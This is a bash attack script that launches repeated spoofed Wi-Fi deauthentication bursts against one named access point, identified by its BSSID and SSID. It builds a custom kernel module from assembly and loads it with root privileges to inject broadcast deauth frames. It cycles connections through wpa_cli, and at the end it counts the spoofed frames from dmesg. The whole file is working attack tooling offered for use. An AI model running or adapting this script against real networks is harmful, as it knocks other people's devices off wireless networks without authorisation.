#!/bin/bash
# deauth_pe_wpa.sh - Multi-round spoofed deauth via wpa_cli
# More reliable than nmcli for target AP connection
#
# Usage: sudo bash /tmp/deauth_pe_wpa.sh [rounds]

ROUNDS=${1:-10}
TARGET_BSSID_LC="04:67:61:d6:dc:92"
HOME_SSID="9899a5b77"

echo "[*] Spoofed deauth attack - $ROUNDS rounds (wpa_cli)"

cd /tmp
[ -f petx4.ko ] || { as -o petx4.o petx4.S && ld -r -o petx4.ko petx4.o; }

# Find home network ID in wpa_supplicant
HOME_ID=$(wpa_cli -i wlan0 list_networks 2>/dev/null | grep "$HOME_SSID" | head -1 | awk '{print $1}')
echo "[*] Home network ID: $HOME_ID"

# Add target network via wpa_supplicant
wpa_cli -i wlan0 remove_network 99 2>/dev/null
TARGET_ID=$(wpa_cli -i wlan0 add_network 2>/dev/null | tail -1)
echo "[*] Target network ID: $TARGET_ID"

# Configure target network
# SSID in hex: e4b88de683b3e4b88ae78fad = 不想上班
wpa_cli -i wlan0 set_network $TARGET_ID ssid '"不想上班"' >/dev/null 2>&1
wpa_cli -i wlan0 set_network $TARGET_ID psk '"dummypassword12345678"' >/dev/null 2>&1
wpa_cli -i wlan0 set_network $TARGET_ID bssid $TARGET_BSSID_LC >/dev/null 2>&1
wpa_cli -i wlan0 set_network $TARGET_ID scan_ssid 1 >/dev/null 2>&1
echo "[*] Target configured"

DEAUTH_COUNT=0
SUCCESS_ROUNDS=0

for round in $(seq 1 $ROUNDS); do
    echo ""
    echo "[*] === Round $round/$ROUNDS ==="

    # Switch to target network
    wpa_cli -i wlan0 select_network $TARGET_ID >/dev/null 2>&1

    # Poll for connection (max 8s)
    OK=0
    for i in $(seq 1 80); do
        if dmesg | tail -3 | grep -q "connected to $TARGET_BSSID_LC"; then
            OK=1
            break
        fi
        sleep 0.1
    done

    if [ $OK -eq 0 ]; then
        echo "    Connection timeout"
        # Try to go back to home
        wpa_cli -i wlan0 select_network $HOME_ID >/dev/null 2>&1
        sleep 2
        continue
    fi

    echo "    Connected! Sending deauths..."
    SUCCESS_ROUNDS=$((SUCCESS_ROUNDS + 1))

    # Send multiple deauths while session is alive
    for burst in 1 2 3; do
        rmmod kfind 2>/dev/null || true
        insmod /tmp/petx4.ko 2>/dev/null
        if [ $? -eq 0 ]; then
            DEAUTH_COUNT=$((DEAUTH_COUNT + 1))
            rmmod kfind 2>/dev/null || true
            sleep 0.15
        else
            break
        fi
    done
    echo "    Sent (total: $DEAUTH_COUNT)"

    # Go back to home
    wpa_cli -i wlan0 select_network $HOME_ID >/dev/null 2>&1

    # Wait for home reconnection + brief pause
    sleep 3
done

echo ""
echo "[*] === RESULTS ==="
echo "[*] $DEAUTH_COUNT spoofed deauths sent in $SUCCESS_ROUNDS/$ROUNDS successful rounds"
echo "[*] Spoofed deauth log:"
dmesg | grep "Deauth TX.*ff:ff:ff:ff:ff:ff.*from 04:67:61" | tail -30

# Cleanup
wpa_cli -i wlan0 remove_network $TARGET_ID >/dev/null 2>&1
wpa_cli -i wlan0 select_network $HOME_ID >/dev/null 2>&1
sleep 3
echo "[*] Connection:"
nmcli connection show --active | head -3
echo "[*] Done."
